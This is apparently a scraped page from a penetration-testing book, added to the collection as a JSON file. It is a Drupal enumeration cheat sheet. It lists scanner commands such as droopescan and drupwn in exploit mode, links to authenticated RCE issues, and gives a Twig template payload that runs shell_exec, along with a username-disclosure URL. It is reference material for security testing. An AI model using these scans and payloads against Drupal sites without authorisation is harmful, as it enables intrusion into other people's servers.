@@ -1,0 +1,88 @@
+{
+    "title": "Drupal",
+    "breadcrumb": [
+        {
+            "title": "Enumeration",
+            "url": "/enumeration"
+        },
+        {
+            "title": "Web Technologies",
+            "url": "/enumeration/webservices"
+        }
+    ],
+    "sections": [
+        {
+            "type": "code_block",
+            "content": [
+                "**Tools** ",
+                "# droopescan",
+                "# https://github.com/droope/droopescan",
+                "droopescan scan drupal -u https://example.com -t 32",
+                "",
+                "# drupwn",
+                "# https://github.com/immunIT/drupwn",
+                "sudo python3 drupwn --mode enum|exploit --target https://example.com",
+                "",
+                "# https://github.com/ajinabraham/CMSScan",
+                "docker build -t cmsscan .",
+                "docker run -it -p 7070:7070 cmsscan",
+                "python3 cmsmap.py -f D https://www.example.com -F",
+                "",
+                "# https://github.com/Tuhinshubhra/CMSeeK",
+                "python3 cmseek.py -u domain.com",
+                "",
+                "# Drupal < 8.7.x Authenticated RCE module upload",
+                "https://www.drupal.org/project/drupal/issues/3093274",
+                "https://www.drupal.org/files/issues/2019-11-08/drupal_rce.tar_.gz",
+                "",
+                "# Drupal < 9.1.x Authenticated RCE Twig templates",
+                "https://www.drupal.org/project/drupal/issues/2860607",
+                "\"Administer views\" -> new View of User Fields - >Add a \"Custom text\"",
+                "\"{{ {\"#lazy_builder\": [\"shell_exec\", [\"touch /tmp/hellofromviews\"]]} }}\"",
+                "",
+                "# If found /node/$NUMBER, the number could be devs or tests pages",
+                "",
+                "# drupal 8",
+                "# https://www.exploit-db.com/exploits/46459",
+                "",
+                "# Check for username disclosure on old versions:",
+                "?q=admin/views/ajax/autocomplete/user/a",
+                ""
+            ]
+        }
+    ],
+    "images": [
+        {
+            "description": "GitHub icon",
+            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/brands/github.svg?v=2&token=a463935e93"
+        },
+        {
+            "description": "Chevron down icon",
+            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/chevron-down.svg?v=2&token=a463935e93"
+        },
+        {
+            "description": "Hashtag icon",
+            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/hashtag.svg?v=2&token=a463935e93"
+        },
+        {
+            "description": "Chevron left icon",
+            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/chevron-left.svg?v=2&token=a463935e93"
+        },
+        {
+            "description": "Chevron right icon",
+            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/chevron-right.svg?v=2&token=a463935e93"
+        }
+    ],
+    "metadata": {
+        "last_updated": "2021-09-20T09:13:19.025Z",
+        "edit_url": "https://github.com/six2dez/pentest-book/blob/master/enumeration/webservices/drupal.md",
+        "previous_page": {
+            "title": "Symfony && Twig",
+            "url": "/enumeration/webservices/symfony-and-and-twig"
+        },
+        "next_page": {
+            "title": "NoSQL (MongoDB, CouchDB)",
+            "url": "/enumeration/webservices/nosql-and-and-mongodb"
+        }
+    }
+}
